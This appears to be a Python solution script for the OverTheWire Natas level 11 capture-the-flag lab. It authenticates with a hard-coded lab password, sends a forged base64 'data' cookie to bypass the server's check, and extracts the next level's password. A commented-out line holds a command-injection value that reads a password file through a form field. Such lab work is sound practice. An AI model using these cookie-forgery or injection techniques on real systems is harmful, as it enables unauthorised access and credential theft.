#!/usr/bin/python3
# -*- coding: utf-8 -*-
import requests
import re
from html import unescape
import urllib
import base64
# write with binary data
# with open('natas11.html', 'wb') as out:
with open('natas11.html', 'w+') as out:
    username = 'natas11'
    password = '1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg'

    url = 'http://%s.natas.labs.overthewire.org' % username

    s = requests.Session()
    # r = s.get(url+'/index-source.html', auth=(username, password))
    # r = s.get(url+'/', auth=(username, password))

    # r = s.post(url, data = {"needle":". /etc/natas_webpass/natas10 #","submit" : "submit"}, auth= (username, password))

    # way transmit cookies 1
    # r = s.get(url, auth= (username, password), cookies = {'data':'MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz'})
    # way transmit cookies 2
    cookies = {'data':'MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz'}
    r = s.get(url, auth= (username, password), cookies = cookies)

    content = r.text

    # # decode url & base64
    # plaintext = base64.b64decode(urllib.parse.unquote(s.cookies['data']))
    # # decode bytes to hex
    # plaintext_plus = plaintext.hex()
    # print(plaintext_plus)
    # out.write(unescape(content))
    out.write(re.findall('The password for natas12 is (.*)<br>', content)[0])
    print(re.findall('The password for natas12 is (.*)<br>', content)[0])
